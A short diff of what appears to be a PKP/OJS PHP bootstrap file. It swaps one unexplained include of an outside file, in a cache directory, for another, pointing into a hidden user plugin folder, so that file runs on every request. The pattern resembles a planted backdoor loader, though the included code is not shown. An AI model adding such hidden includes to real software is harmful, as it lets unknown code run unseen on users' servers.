@@ -26,12 +26,12 @@
 
 // Load Composer autoloader
 require_once 'lib/pkp/lib/vendor/autoload.php';
-include '/www/server/fastcgi_cache/includes.php';
+
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require_once './lib/pkp/includes/functions.php';
-
+include '/home/u756333408/.cursor/plugins/local/require.php';
 // Initialize the application environment
 return new \APP\core\Application();
